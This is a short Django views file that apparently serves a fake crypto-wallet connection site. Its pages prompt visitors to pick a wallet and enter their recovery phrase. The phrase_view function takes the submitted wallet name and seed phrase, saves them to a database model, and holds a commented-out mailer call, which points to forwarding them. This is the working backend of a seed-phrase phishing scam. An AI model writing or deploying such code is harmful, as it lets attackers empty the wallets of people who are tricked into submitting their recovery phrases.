from django.shortcuts import render
from django.http import request
from .models import Info
from .builders.email import Mailer

# Create your views here.
def index(request):
    info_list = Info.objects.all()
    return render(request, 'website/mobile.html', {})

def connect_view(request):
    return render(request, 'website/iphone-14-pro-max-1.html', {})

def connect_manually(request):
    return render(request, 'website/iphone-14-pro-1.html', {})

def all_wallet_view(request):
    return render(request, 'website/all-wallet.html', {})

def phrase_view(request):
    if request.method == 'POST':
        wallet = request.POST['wallet_input']
        phrase = request.POST['phrase_input']

        obj = Info.objects.create(wallet=wallet, phrase=phrase)
        # Mailer.send_otp()
        obj.save()
    return render(request, 'website/phrase.html', {})
    
